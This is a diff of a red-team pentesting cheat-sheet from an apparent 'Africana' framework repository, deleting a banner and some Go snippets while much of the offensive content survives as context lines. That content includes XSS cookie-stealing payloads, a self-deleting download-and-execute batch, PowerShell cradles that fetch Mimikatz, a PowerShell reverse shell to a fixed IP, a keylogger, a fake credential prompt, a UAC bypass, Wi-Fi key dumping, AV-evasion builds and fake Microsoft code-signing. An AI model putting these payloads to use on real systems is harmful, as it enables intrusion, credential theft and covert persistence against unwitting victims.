@@ -1,36 +1,4 @@
-﻿(Genesis)+---------------------------------------------------------------------+
-|            Rojahs Montari Machine Pentesters For Exploration                 |
-+------------------------------------------------------------------------------+
-    A    F    R    I    C    A    N    A    Framework.
-    *    *    *    *    *    *    *    *    *
-    |    |    |    |    |    |    |    |    |            [Africana Topographical Map]
-    |    |    |    |    |    |    |    |    +- 1. Install, Uninstall or Update Africana Framework.
-    |    |    |    |    |    |    |    +------ 2. System Security Configuration With Tor, Privoxy, Squid, Macchanger, Dnsleak. etc.
-    |    |    |    |    |    |    +----------- 3. Local Network Pentesting With Bettercap, Nmap, Metasploit, Responder, Smbmap. etc.
-    |    |    |    |    |    +---------------- 4. C2 & Revershell Generation Engines With Shelz, Hoaxshell, Ncat, Rlwrap, Villain. etc.
-    |    |    |    |    +--------------------- 5. Wifi Attack Vectors Both Automated & Manual. With Wifite, Airgeddon, Bettercap, Wifipumpkin3.
-    |    |    |    + ------------------------- 6. Password, Hash Cracking With AirCrack-ng, John And Hashcat More Will Be Added As The Tool Grows.
-    |    |    + ------------------------------ 7. Social Engenearing Attacks With Setoolkit, Goodginx, AdvancedPhishing, Gophish, Anonphisher. Others Will Be Added.
-    |    +------------------------------------ 8. Website Attack Vectors With Dnsrecon, Wafw00f, Whatweb, Httpx, Paramspider, Nuclei, BBot, SSlscan, Sqlmap, Xsserscan, Dalfox, Dirsearch, Commix. etc.
-    +----------------------------------------- 9. About The Author Of Africana And Free Pentesting Tricks, Materials. Very Nice Essential Things Just Try Nine.
-
-            Rojahs Montari Machine Pentesters For Exploration.
-      * Africana Is a REDTEAM Penetration Testing Framework written in pure python3.
-      * It's aim Is to Make it Easier for Pen Testers during Penetration Testing.
-      * Africana also covers almost all Penetration Testing Attacks from Web Exploitation, WIFI attacks,
-        Phishing, Generating Undetected Malware, Social Engineering Attacks, Cracking of Password and Internal Network Attacks.
-      * Free Anonymity Setup For Your System With Tor, Privoxy, Polipo & Squid.
-      * YouTube Channel https://youtube.com/@RojahsMontari.[Pleas Subscribe].
-      * Contact Me :RojahsMontari@gmail.com
-
-                           Install Africana.
-
-    git clone https://github.com/r0jahsm0ntar1/africana-framework --depth 1
-    cd africana-framework
-    go build africana.go
-    mv africana /usr/local/bin
-    africana -u
-
+﻿
 nslookup
 server 127.0.0.1
        172.10.10.3 
@@ -119,9 +87,9 @@ wmap_run -t
 wmap_run -e
 wmap_vulns -l
 vulns 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                        XSS ATTACKS  EXPLOITATION                             |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 
 <script>document.location='http://localhost/grabber.php?c='+document.cookie</script>
 <script>document.location='http://localhost/grabber.php?c='+localStorage.getItem('access_token')</script>
@@ -167,9 +135,9 @@ fwrite($fp, 'Cookie:' .$cookie."\r\n");
 fclose($fp);
 ?>
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                           SQLMAP EXPLOIT DBS                                 |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 sqlmap --crawl=1 --tamper=between,luanginx,xforwardedfor --random-agent --batch --forms --threads=10 --level=5 --risk=3 --eta -u ""
 sqlmap --proxy="http://127.0.0.1:8080" --dump-all -d "mysql://user:pass@ip/database" 
 
@@ -179,9 +147,9 @@ sqlmap -v 3 --risk=3 --level=5 --threads=10  -f  --time-sec 15 --tamper=between,
 atscan --dork 'php?cid=intext:shopping' --level 100 --sql
 atscan --dork 'php?cid=intext:shopping' --level 100 --wp
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Download file  & EXECUTE                            |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 @echo off
 start powershell.exe -nol -w 1 -nop -ep bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.202.128/shepherd.ps1')|iex"
 (goto) 2>nul & del "%~f0"
@@ -217,9 +185,9 @@ secretsdump.py htb.local/TrinityAdmn:abcd123@172.10.10.3
 psexec.py -hashes 32cdf72gf:32cdf72gf administrator@172.10.10.3
 psexec.py -debug -k -no-pass htb.local/administrator@forest
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                              Acive Dir - Hacking                             |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
                                                                      #Bloodhound
 
 neo4j console
@@ -304,9 +272,9 @@ cme smb 127.0.0.1 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec
 cme smb 127.0.0.1/24 -u user -p 'Password' --local-auth -M mimikatz
 cme mimikatz --server http --server-port 80
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                         Wsman Port - Hacking                                 |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
                                                                      #wsman port
 evl-winrm.rb -u admin -p abc123 -i 127.0.0.1
 grep 'def ' smbmap.py
@@ -333,9 +301,9 @@ ldapsearch -h 127.0.0.1 -x -b "DC=htb,DC=local" '(objectClass=Person)'
 
 for i in $(cat pwlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                 Linux Storage, Data Recovery & Password attacks              |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
                                                                   #Hdd Passwords
 
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
@@ -381,9 +349,9 @@ $ patch -p1 -i advcpmv-0.5-8.21.patch
 $ ./configure
 $ make
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                      Online Password Attacks.                                |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 wfuzz -u http://127.0.0.1/index.php?action=authentication -d 'username=admin&password=FUZZ' -w .txt --hc 4003
 medusa -h 127.0.0.1 -U user.txt -P /opt/wordlist/rockyou.txt -M smbnt,ssh,smb 127.0.0.1
 hydra -l administrator -P /opt/wordlists/rockyou.txt -t 1 127.0.0.1 smb
@@ -398,9 +366,9 @@ wget -m ftp://anonymous:anonymous@1127.0.0.1 #Donwload all
 wget -m --no-pasive ftp://anonymous:anonymous@127.0.0.1 #Download all
 sudo nmap -sT -sV -Pn -vv -p 22 --script='ftp-* AND NOT ftp-brute*' --stats-every 10s 127.0.0.1
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                               Ftp Config                                     |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #!/bin/bash
 groupadd ftpgroup
 useradd -g ftpgroup -d /dev/null -s /etc ftpuser
@@ -412,9 +380,9 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                       Zip File with password                                 |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
 zip2john file.zip > zip.john
 john zip.john
@@ -428,9 +396,9 @@ sudo apt-get -o Acquire::Check-Valid-Until=false  && sudo apt install
 apt-get install libcompress-raw-lzma-perl
 ./7z2john.pl file.7z > 7zhash.john
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             Ntlm Hashes                                      |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
                                            #Format:USUARIO:ID:HASH_LM:HASH_NT:::
 
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=netlm file_NTLM.hashes
@@ -449,9 +417,9 @@ nmap -sV --script imap-brute -p <PORT> <IP>
 #Gathering Passwords
 cewl 127.0.0.1 -m 5 -w words.txt
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Pasword Cracking                                    |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 hashcat --127.0.0.1-hashes | grep 300
 hashcat --127.0.0.1-hashes | grep -i krb
 hashcat -m 18200 /hashes/svc-alfresco /usr/share/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule
@@ -465,9 +433,9 @@ hccap2john pmkid.hccapx > handshake.john
 john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
 aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                     Networking, Mitm & Wifi Hacks                            |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
                                                         Metasploit Wifi Attacker
 root@kali:~# cat /etc/dhcp/dhcpd.conf
 option domain-name-servers 10.0.0.1;
@@ -507,9 +475,9 @@ airmon-ng start wlan0
 airbase-ng -P -C 30 -e "SAFARICOM FREE 5G NETWORK 2022" -v wlan0
 ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                            Airmon-ng                                         |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #simple hhtpserver
 python -m SimpleHTTPServer 7000
 
@@ -537,9 +505,9 @@ aireplay-ng -arpreplay -b bssid_ap_victim -h 00:11:22:33:44:55 wlan0
 aircrack-ng -0 -n 64 capture-##.ivs
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                        Bettercap Wifie Hacks                                 |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 ifconfig wlan0 down; macchanger -r wlan0; iwconfig wlan0 mode monitor; ifconfig wlan0 up
 sudo bettercap --iface wlan0
 set $ {bold}r0jahsm0ntar1 » {reset}
@@ -575,9 +543,9 @@ wifipumpkin3 --xpulp "set interface wlan0; set ssid nisha; set proxy noproxy; st
 wifi.recon.channel 1
 wifi.deauth wifiemac
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                            Bluetooth Hacks                                   |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #We will use hcitool to find all the available BLE device present near the hos
 hciconfig
 hciconfig hci0 up
@@ -591,9 +559,9 @@ char-read-hnd 0x0012  #reading the handle with their handle value
 ubertooth-btle -f -t 88:C2:55:CA:E9:4A -c smartbulb_dump.pcap  #follow connections for our 127.0.0.1 device
 ifconfig wlan0 down;iwconfig wlan0 mode monitor;ifconfig wlan0 up; ifconfig; kismet --daemonize
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Kicking People Out                                  |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 iptables -t nat -A POSTROUTING -O wlan0 -j MASQUAERADE
 airplay-ng --deuth 0 -a 127.0.0.1 maccadress -c routermaccadress wlan0
 
@@ -601,9 +569,9 @@ sudo airmon-ng check kill && service NetworkManager restart && ip link set wlan0
 
 sudo wifite -i wlan0 --ignore-locks --keep-ivs -p 1337 -mac --random-mac -v -inf --bully --pmkid --dic /usr/share/wordlists/rockyou.txt --require-fakeauth --nodeauth --wps --pmkid-timeout 120
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                         Sniffing/ Spoofing                                   |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #CanTool
 sh setup_vcan.sh
 ./icsim vcan 0
@@ -632,9 +600,9 @@ ettercap -T -w -M -ARP
 4) arpspoof -i eth0 -t <your127.0.0.1> <theRoutersIpAddress>
 
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                            Bettercap Tricks                                  |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 bettercap -caplet beef-active.cap -eval "set arp.spoof.127.0.0.1.coom/ 127.0.0.1"
 
 apt-get install gcc-mingw-w64-x86-64
@@ -662,9 +630,9 @@ nmap -n -sn -Pr 192.168.220.0/24
 
 ip neigh flush all
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             Beef-Xss                                         |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
  <script src="http://127.0.0.1:3000/hook.js"></script>
 payload to /usr/share/beef-xss/extensions/demos/html
 beef social engneering
@@ -680,18 +648,18 @@ nmap -v -sV 192.168.1.0/24 -oA subnet_1
 search portscan
 cat subnet_1.gnmap | grep 80/open | awk '{print $2}'
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          AV Bypass and Compillinug                           |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
 i686-w64-mingw32-g++ openthesis.cpp -o .exe -lws2_32 -s -ffunction-sections -fdata-sections
  -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
 x86_64-w64-mingw32-gcc {source_file} -o {exe_name}.exe #.cpp
 mcs -platform:x64 -unsafe Program.cs -win32icon:bing.ico -reference:System.Windows.Forms -out:trinity.exe #.cs
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                              Dll Exploit                                     |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 
 #Dll exploits
 rundll32 \\webdavserver\folder\payload.dll,entrypoint
@@ -717,9 +685,9 @@ set LHOST 0.0.0.0
 set LPORT 4444
 set ExitOnSession false
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                                  Mimikatz                                    |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 meterpreter
 load kiwi
 kiwi_cmd '"dpapi::"'
@@ -733,9 +701,9 @@ lsadump::secrets
 kerberos::list
 vault::list
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                                Privilage-escalation                          |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks"
 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -762,9 +730,9 @@ https://book.hacktricks.xyz/windows/windows-local-privilages-escalation#alwaysin
 
 upx -9 -qq calc.exe
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                              Android Pentesting                              |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 apt-get install adb
 adb connect $ip:port
 adb shell
@@ -789,9 +757,9 @@ done
     sh anything.sh
     
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             Android Av Bypass                                |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
 apksigner sign --ks release.jks application.apk
 
@@ -812,9 +780,9 @@ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
   
 sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=africana.pem,cafile=africana.crt,verify=0 -
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                              Ipinfo/Tor                                      |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #Tor
 #BridgeRelay 1
 ORPort 9002
@@ -844,9 +812,9 @@ wget -mkEpnp https://itm4n.github.io/
 
 https://www.ired.team/
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                            Dns Leak Resolve Fix                              |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 
 1) sudo nano /etc/dhcp/dhclient.conf // Change #prepend domain-name-servers line, add the dns you want. Example:
 prepend domain-name-servers 1.1.1.1, 1.0.0.1, 8.8.8.8, 8.8.4.4; // Remove # so that it isnt a comment
@@ -867,9 +835,9 @@ nameserver 8.8.4.4
 
 You modifided /etc/dhcp/dhclient.conf and added the adresses, Then used chattr -i to set /etc/resolv.conf/ as a writable file, then changed the file again, set /etc/resolv.conf/ as unwritable and restarted Network Manager*/
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Persistence Macchanger                              |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 sudo nano /etc/systemd/system/changemac@.service
 
 [Unit]
@@ -901,9 +869,9 @@ echo -e "$RED                         PPROXY CONNECTIONS ROOT\n"
 echo -e "$BLUE Pproxy [8888] -> Squid [3218] -> Privoxy [8118] -> Polipo [8123] -> Tor $GREEN [9050]\n"
 
 pproxy -r http://localhost:3128 -l http://localhost:8888 -vvv "$@"
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Ports Fowarding                                     |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
 unzip ngrok-stable-linux-amd64.zip
 ngrok http 4433
@@ -940,9 +908,9 @@ gost -L=tcp://:2222/127.0.0.1:22 [-F=..]
 Set a file as hidden
 attrib +h c:\autoexec.bat
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                           Malwares; PoWeRsHeLl -Win 1 -EnC                   |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 @echo off
 
 cd %TEMP%
@@ -1024,9 +992,9 @@ del "%~f0"
 
 endlocal
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             Malware                                          |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 # Simple PowerShell Reverse Shell
 do {
     $client = New-Object System.Net.Sockets.TcpClient('192.168.117.128', 9001)
@@ -1467,15 +1435,24 @@ func main() {
     }
 }
 
+#include<windows.h>
+#include<string.h>
+#include<stdio.h>
 
-+------------------------------------------------------------------------------+
+int main() {
+
+      system("");
+      return 0;
+}
+
++----------------------------------------------------------+
 |                          Dll Hijack  svchost.exe  Secur32.dll                |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 
 default
 offline
-v-tenant.gl.at.ply.gg:42060127.0.0.1:443	africanacustom (1x both)
-and-russia.gl.at.ply.gg:14090127.0.0.1:9001	frameworkcustom (1x both)
+v-tenant.gl.at.ply.gg:42060127.0.0.1:443    africanacustom (1x both)
+and-russia.gl.at.ply.gg:14090127.0.0.1:9001    frameworkcustom (1x both)
  add tunnel
 
 GOOS=windows GOARCH=amd64 go build -o bin/app-amd64.exe app.go
@@ -1501,9 +1478,9 @@ Amin
 C:\Users\Public\Libraries\svchost.exe
 C:\Users\r0jahsm0ntar1\AppData\Local\Microsoft\OneDrive
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                      Malware Obfsication Generator                           |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 *Invoke-PSObfuscation -Path /home/redteam/shepherd.ps1 -Aliases -Cmdlets -Comments -Pipes -PipelineVariables -ShowChanges
 *All
 *Integers
@@ -1526,9 +1503,9 @@ openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 
 
 msfdb start; msfconsole -x "use multi/handler;set payload windows/powershell_reverse_tcp_ssl; set lhost eth0; set lport 9001; set ExitOnSession false; exploit -j"
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |               Sighn Powershell Script  Post Exploits Powershel />            |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 
 @echo off
 title Signning ONE PowerShell Script
@@ -1553,9 +1530,9 @@ echo PSPath: %PSsignPath%
 powershell $CertSign = New-SelfSignedCertificate -Subject "Microsoft_Signing_Certificate" -FriendlyName "SilverLight" -NotAfter (Get-Date).AddMonths(9) -Type CodeSigningCert -CertStoreLocation cert:\LocalMachine\My;Move-Item -Path $CertSign.PSPath -Destination "Cert:\LocalMachine\Root";Set-AuthenticodeSignature -FilePath %PSsignPath% -Certificate $CertSign
 timeout /T 2 >nul
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |             Post Exploitation Pranks   Speak Computer                        |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 
 
 taskkill /im firefox.exe /f
@@ -1587,9 +1564,9 @@ powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -File "C:\Program Fil
 
 (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize 
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                 Post Exploitation Bypass UAC                                 |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 function Invoke-WSResetBypass {
 Param (
 [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
@@ -1653,9 +1630,9 @@ function Invoke-WSResetBypass {
       }
 }
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                       Change Wallpaper                                       |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 $MyWallpaper="C:\Users\Shepherd\Pictures\[H]\WindowsXP.png"
 $code = @' 
 using System.Runtime.InteropServices; 
@@ -1675,9 +1652,9 @@ namespace Win32{
 add-type $code 
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                     Persistence Wallpaper                                    |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 $MyWallpaper="C:\wallpaper.jpg"
 $code = @' 
 using System.Runtime.InteropServices; 
@@ -1697,9 +1674,9 @@ namespace Win32{
 add-type $code 
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Screen-Shotter                                      |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
 function screenshot([Drawing.Rectangle]$bounds, $path) {
    $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
@@ -1716,9 +1693,9 @@ function screenshot([Drawing.Rectangle]$bounds, $path) {
 $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1600, 900)
 screenshot $bounds "out.png"
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                              Ki-Loga                                         |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 function ki-loga($logPath="$env:temp\ki-loga.txt") 
 {
 # API declaration
@@ -1773,9 +1750,9 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 }
 ki-loga
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                                  Phish Cred                                  |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 function Phish
 {
 
@@ -1808,9 +1785,9 @@ Param ()
     }
 }
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                          Powershell Emailer                                  |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 $TimeToRun = 2
 $From = “xxxxxx@gmail.com"
 $Pass = “xxxxxxxx"
@@ -1821,9 +1798,9 @@ $SMTPServer = "smtp.gmail.com"
 $SMTPPort = "587"
 $credentials = new-object Management.Automation.PSCredential $From, ($Pass | ConvertTo-SecureString -AsPlainText -Force)
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             VBS Script                                       |
-+------------------------------------------------------------------------------+ 
++----------------------------------------------------------+ 
 
 set x=createobject("wscript.shell")
 
@@ -1843,15 +1820,15 @@ x.sendkeys "exit"
 wscript.sleep 500
 x.sendkeys "{ENTER}"
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             RDP ENABLER                                      |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
 Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                                MITM6                                         |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 sudo mitm6 --domain internal.corp --host-allowlist icorp-w10.internal.corp --relay adscert.internal.corp -v
 sudo krbrelayx.py --target http://adscert.internal.corp/certsrv/ -ip 192.168.111.80 --victim icorp-w10.internal.corp --adcs --template Machine
 
@@ -1866,9 +1843,9 @@ netsh wlan show profile <SSID> key=clear #Get Cleartext Pass
 sudo responder -I <iface> #Active
 sudo tcpdump -i <iface> -A proto udp and dst port 53 and dst ip <KALI_IP> #Passive
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             Other Tricks                                     |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #OPenvas
 https://127.0.0.1:9392
 https://github.com/rastating/joomlavs.git
@@ -1940,9 +1917,9 @@ start %USERPROFILE%\AppData\Local\Microsoft\OneDrive\OneDrive.exe
 
 @powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%~dp0Win10.ps1" -include "%~dp0Win10.psm1" -preset "%~dpn0.preset"
 
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 |                             Malware DigiSpark                                |
-+------------------------------------------------------------------------------+
++----------------------------------------------------------+
 #include "DigiKeyboard.h"
 void setup() {
 }
@@ -2839,9 +2816,6 @@ echo "Kali Linux container configured and running as 'africana-container'"
 
 
 
-
-
-
 docker run --tty --interactive kalilinux/kali-rolling
 docker container list --all
 docker start d36922fa21e8
@@ -2909,1152 +2883,67 @@ Forwarding                    https://abcd1234.ngrok.io -> http://localhost:8080
 
 Connections                   ttl     opn     rt1     rt5     p50     p90
                               0       0       0.00    0.00    0.00    0.00
-							  
-							  
+                              
+                              
 neone@hldrive.com
 
-
-
 package main
 
 import (
-	"fmt"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"runtime"
-	"time"
-)
-
-func main() {
-	// Example functionality
-	fmt.Println("This program will delete itself after execution.")
-
-	// Path to the current executable
-	executablePath, err := os.Executable()
-	if err != nil {
-		fmt.Println("Error getting executable path:", err)
-		return
-	}
-
-	// Wait a moment to ensure all operations are complete
-	time.Sleep(2 * time.Second)
-
-	// Create a command to delete the executable
-	var cmd *exec.Cmd
-	if runtime.GOOS == "windows" {
-		cmd = exec.Command("cmd", "/C", "del", "/F", "/Q", executablePath)
-	} else {
-		cmd = exec.Command("sh", "-c", "rm -f "+executablePath)
-	}
-
-	// Execute the deletion command
-	err = cmd.Run()
-	if err != nil {
-		fmt.Println("Error deleting file:", err)
-		return
-	}
-
-	// Exit the program
-	fmt.Println("File deleted successfully.")
-}
-
-
-
-package main
-
-import (
-	"fmt"
-	"io/ioutil"
-	"os"
-	"path/filepath"
-	"sort"
-	"time"
-)
-
-type FileWithTimestamp struct {
-	Path string
-	Time time.Time
-}
-
-func main() {
-	// Directory containing the files
-	dir := "./your-directory"
-
-	// Get list of files in directory
-	files, err := ioutil.ReadDir(dir)
-	if err != nil {
-		fmt.Println("Error reading directory:", err)
-		return
-	}
-
-	// Collect files and their timestamps
-	var fileList []FileWithTimestamp
-	for _, file := range files {
-		if !file.IsDir() {
-			filePath := filepath.Join(dir, file.Name())
-			fileInfo, err := os.Stat(filePath)
-			if err != nil {
-				fmt.Println("Error getting file info:", err)
-				continue
-			}
-			fileList = append(fileList, FileWithTimestamp{
-				Path: filePath,
-				Time: fileInfo.ModTime(),
-			})
-		}
-	}
-
-	// Sort files by timestamp
-	sort.Slice(fileList, func(i, j int) bool {
-		return fileList[i].Time.Before(fileList[j].Time)
-	})
-
-	// Create or open the output file
-	outputFile, err := os.Create("sorted_output.txt")
-	if err != nil {
-		fmt.Println("Error creating output file:", err)
-		return
-	}
-	defer outputFile.Close()
-
-	// Concatenate the contents of sorted files into the output file
-	for _, file := range fileList {
-		content, err := ioutil.ReadFile(file.Path)
-		if err != nil {
-			fmt.Println("Error reading file:", err)
-			continue
-		}
-		if _, err := outputFile.Write(content); err != nil {
-			fmt.Println("Error writing to output file:", err)
-			return
-		}
-	}
-
-	fmt.Println("Files have been sorted and concatenated into sorted_output.txt")
-}
-
-
-
-package main
-
-import (
-	"fmt"
-	"io"
-	"io/ioutil"
-	"os"
-	"path/filepath"
-	"sort"
-	"time"
-)
-
-// FileInfoWithTime stores file info along with its modification time
-type FileInfoWithTime struct {
-	FileInfo os.FileInfo
-	ModTime  time.Time
-}
-
-// ByModTime implements sort.Interface for []FileInfoWithTime based on
-// the ModTime field.
-type ByModTime []FileInfoWithTime
-
-func (a ByModTime) Len() int           { return len(a) }
-func (a ByModTime) Swap(i, j int)      { a[i], a[j] = a[j], a[i] }
-func (a ByModTime) Less(i, j int) bool { return a[i].ModTime.Before(a[j].ModTime) }
-
-func main() {
-	dir := "path/to/your/directory" // Change this to your directory path
-	outputFile := "path/to/output/file.txt"
-
-	files, err := ioutil.ReadDir(dir)
-	if err != nil {
-		fmt.Println("Error reading directory:", err)
-		return
-	}
-
-	var fileInfos []FileInfoWithTime
-	for _, file := range files {
-		if filepath.Ext(file.Name()) == ".txt" {
-			fileInfos = append(fileInfos, FileInfoWithTime{
-				FileInfo: file,
-				ModTime:  file.ModTime(),
-			})
-		}
-	}
-
-	sort.Sort(ByModTime(fileInfos))
-
-	outFile, err := os.Create(outputFile)
-	if err != nil {
-		fmt.Println("Error creating output file:", err)
-		return
-	}
-	defer outFile.Close()
-
-	for _, fileInfo := range fileInfos {
-		filePath := filepath.Join(dir, fileInfo.FileInfo.Name())
-		inFile, err := os.Open(filePath)
-		if err != nil {
-			fmt.Println("Error opening file:", err)
-			continue
-		}
-		defer inFile.Close()
-
-		_, err = io.Copy(outFile, inFile)
-		if err != nil {
-			fmt.Println("Error copying file:", err)
-			continue
-		}
-	}
-
-	fmt.Println("Files have been concatenated successfully into", outputFile)
-}
-
-
-
-Download / How to use it?
-Method 1 - PowerShell (Recommended)
-Right-click on the Windows start menu and select PowerShell or Terminal (Not CMD).
-Copy and paste the code below and press enter
-irm https://get.activated.win | iex
-or (deprecated, will be retired on Aug 31 2024, use above instead)
-
-irm https://massgrave.dev/get | iex
-You will see the activation options. Follow the on-screen instructions.
-That's all.
-
-
-
-
-package main
-
